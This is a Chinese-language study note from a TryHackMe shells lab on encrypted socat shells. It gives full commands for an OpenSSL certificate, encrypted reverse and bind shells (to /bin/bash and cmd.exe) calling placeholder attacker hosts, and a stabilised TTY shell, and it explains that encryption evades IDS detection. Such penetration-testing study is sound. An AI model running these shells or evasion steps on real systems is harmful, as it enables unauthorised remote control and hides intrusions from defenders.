> [!info] LINK & TAG
> [TryHackMe | What the Shell?](https://tryhackme.com/room/introtoshells)
> 
> #tag

# Socat 加密 Shell (OpenSSL) 技術筆記

## 1. 為什麼要使用加密 Shell？

- **安全性**：除非擁有解密金鑰，否則無法監聽 Shell 內容。
    
- **規避偵測**：由於流量經過加密，許多 **IDS (入侵檢測系統)** 無法識別其中的惡意指令，進而達成繞過效果。
    

---

## 2. 準備工作：生成憑證 (Certificate)

在開始連線前，必須先在**攻擊機**上生成一份自簽名憑證。

1. **生成 RSA 金鑰與憑證：**
    
    Bash
    
    ```
    openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
    ```
    
    - 過程中會詢問組織資訊，可全部留白或隨機填寫。
        
2. 合併為 PEM 檔案：
    
    Socat 需要將金鑰與憑證合併在同一個檔案中。
    
    Bash
    
    ```
    cat shell.key shell.crt > shell.pem
    ```
    

---

## 3. 加密Reverse Shell (OpenSSL Reverse Shell)

核心概念：將原本指令中的 `TCP` 替換為 `OPENSSL`。

- 攻擊機（監聽端）：
    
    必須攜帶憑證檔案。
    
    Bash
    
    ```
    socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
    ```
    
- **目標機（連回端）：**
    
    Bash
    
    ```
    socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
    ```
    

> **關鍵參數 `verify=0`**：告訴 Socat 不去驗證憑證是否由受信任的機構簽署。

---

## 4. 加密Bind Shell (OpenSSL Bind Shell)

注意：即使目標是 Windows，**監聽端**也必須擁有 `.pem` 憑證，因此需要將檔案上傳至目標機。

- **目標機（監聽端）：**
    
    Bash
    
    ```
    socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
    ```
    
- **攻擊機（連入端）：**
    
    Bash
    
    ```
    socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
    ```
    

---

## 5. 進階：加密且穩定的 TTY Shell

結合前一章節的 **TTY 穩定化技術** 與 **OpenSSL 加密**，可以得到最強大的 Linux Shell。

### **攻擊機（監聽端）**

Bash

```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
```

### **目標機（連回端）**

Bash

```
socat OPENSSL:<ATTACKER-IP>:<PORT>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

---

## 總結表格：加密與非加密對比

|**類型**|**非加密語法 (Unencrypted)**|**加密語法 (OpenSSL)**|
|---|---|---|
|**協定前綴**|`TCP` / `TCP-L`|`OPENSSL` / `OPENSSL-LISTEN`|
|**必備參數**|無|`cert=shell.pem`, `verify=0`|
|**IDS 檢測**|易被內容偵測|難以被內容偵測 (加密流量)|
